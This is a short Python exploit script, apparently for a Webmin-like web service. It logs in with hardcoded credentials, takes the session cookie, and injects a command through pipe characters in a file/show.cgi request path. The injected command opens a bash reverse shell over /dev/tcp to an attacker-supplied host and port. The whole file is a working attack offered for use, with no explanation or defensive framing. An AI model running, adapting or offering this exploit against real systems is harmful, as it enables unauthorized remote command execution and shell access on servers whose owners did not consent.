#!/usr/bin/env python

#usage: python3 web.py <targetIP>
import sys, requests, string, secrets

targetIP = ""
lhost = "" #attacking IP
lport = "" #listening port

data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}
url = f"http://{targetIP}/session_login.cgi"

r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)

if r.status_code == 302 and r.cookies["sid"] != None:
    print("[+] Login successful, executing payload")
else:
    print("[-] Failed to login")

sid = r.cookies["sid"]

def rand():
    alphaNum = string.ascii_letters + string.digits
    randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
    return randChar

def payload():
    payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"
    return payload

exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"

req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)
